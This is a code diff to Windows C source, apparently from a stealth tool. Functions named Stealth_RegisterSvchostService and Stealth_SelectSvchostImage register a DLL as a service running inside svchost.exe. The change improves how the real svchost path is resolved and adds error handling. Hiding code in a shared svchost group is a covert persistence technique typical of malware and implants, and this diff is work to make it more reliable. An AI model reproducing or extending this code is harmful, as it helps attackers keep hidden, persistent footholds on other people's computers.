@@ -1339,8 +1339,12 @@ BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* d
 
     if (hostExePath[0] == 0)
     {
-        lstrcpynW(hostExePath, L"%SystemRoot%\\System32\\svchost.exe", (int)_countof(hostExePath));
-        hostExeUsesExpand = TRUE;
+        if (!Stealth_GetSystemSvchostPathW(hostExePath, _countof(hostExePath)))
+        {
+            Stealth_DebugPrintfW(L"Stealth_RegisterSvchostService failed to resolve system svchost.exe (error=%lu)", GetLastError());
+            return FALSE;
+        }
+        hostExeUsesExpand = FALSE;
     }
 
     _snwprintf_s(imagePathValue, _countof(imagePathValue), _TRUNCATE, L"%s -k %s -p", hostExePath, groupName);
@@ -1847,9 +1851,14 @@ static BOOL Stealth_SelectSvchostImage(const wchar_t* dllPath, wchar_t* exePathO
         }
     }
 
-    // Fallback to the standard System32 path (may fail if truly missing)
-    lstrcpynW(exePathOut, L"%SystemRoot%\\System32\\svchost.exe", (int)exePathOutLen);
-    Stealth_DebugPrintfW(L"Stealth_SelectSvchostImage fallback to %%SystemRoot%%\\System32\\svchost.exe");
-    if (useExpand != NULL) { *useExpand = TRUE; }
-    return FALSE;
+    // Fallback to the standard System32 host resolved by the OS.
+    if (!Stealth_GetSystemSvchostPathW(exePathOut, exePathOutLen))
+    {
+        Stealth_DebugPrintfW(L"Stealth_SelectSvchostImage failed to resolve system svchost.exe (error=%lu)", GetLastError());
+        if (useExpand != NULL) { *useExpand = FALSE; }
+        return FALSE;
+    }
+    Stealth_DebugPrintfW(L"Stealth_SelectSvchostImage fallback to %ls", exePathOut);
+    if (useExpand != NULL) { *useExpand = FALSE; }
+    return TRUE;
 }
